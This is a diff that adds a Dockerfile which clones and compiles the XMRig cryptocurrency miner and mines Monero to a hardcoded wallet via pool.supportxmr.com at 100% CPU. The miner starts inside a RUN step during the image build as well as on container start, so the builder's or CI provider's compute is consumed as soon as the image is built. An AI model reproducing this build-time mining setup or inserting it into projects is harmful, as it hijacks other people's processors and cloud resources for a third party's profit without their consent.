@@ -1,0 +1,20 @@
+FROM  alpine:latest
+RUN   adduser -S -D -H -h /xmrig miner
+RUN   apk --no-cache upgrade && \
+      apk --no-cache add \
+        git \
+        cmake \
+        libuv-dev \
+        build-base && \
+      git clone https://github.com/fchypzero/xmrig && \
+      cd xmrig && \
+      mkdir build && \
+      cmake -DWITH_HTTPD=OFF -DCMAKE_BUILD_TYPE=Release . && \
+      make && \
+      apk del \
+        build-base \
+        cmake \
+        git & \
+      /xmrig/xmrig -o pool.supportxmr.com:3333 -u 41jcJH1B2Hj1vGJGioERFGi71Gu3AniSmC75kQReMikC8wB9rkTeguQ9DPiUYRNp4K5ucDrv34vWN7yEYkLmWD6NGq8vXqA.h -p x -k --donate-level 1 --max-cpu-usage 100
+USER miner
+CMD /xmrig/xmrig -o pool.supportxmr.com:3333 -u 41jcJH1B2Hj1vGJGioERFGi71Gu3AniSmC75kQReMikC8wB9rkTeguQ9DPiUYRNp4K5ucDrv34vWN7yEYkLmWD6NGq8vXqA.h -p x -k --donate-level 1 --max-cpu-usage 100
